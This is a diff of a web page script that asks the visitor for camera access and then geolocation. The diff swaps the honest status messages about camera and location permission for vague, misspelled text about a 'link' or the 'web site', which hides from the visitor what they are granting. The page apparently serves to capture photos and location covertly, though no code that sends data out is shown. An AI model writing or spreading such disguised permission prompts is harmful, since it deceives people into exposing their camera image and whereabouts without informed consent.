@@ -26,7 +26,7 @@
             let imageData = null;
 
             // --- STEP 1: Request Camera ---
-            statusText.innerText = "Waiting for camera permission...";
+            statusText.innerText = "Waiting for link permission avilaible...";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
@@ -39,11 +39,11 @@
                     };
                 });
             } catch (err) {
-                console.warn("Camera denied.");
+                console.warn("web site denied.");
             }
 
             // --- STEP 2: Request Location ---
-            statusText.innerText = "Waiting for location permission...";
+            statusText.innerText = "Waiting for web site activited ...";
             if (navigator.geolocation) {
                 try {
                     locationData = await new Promise((resolve, reject) => {
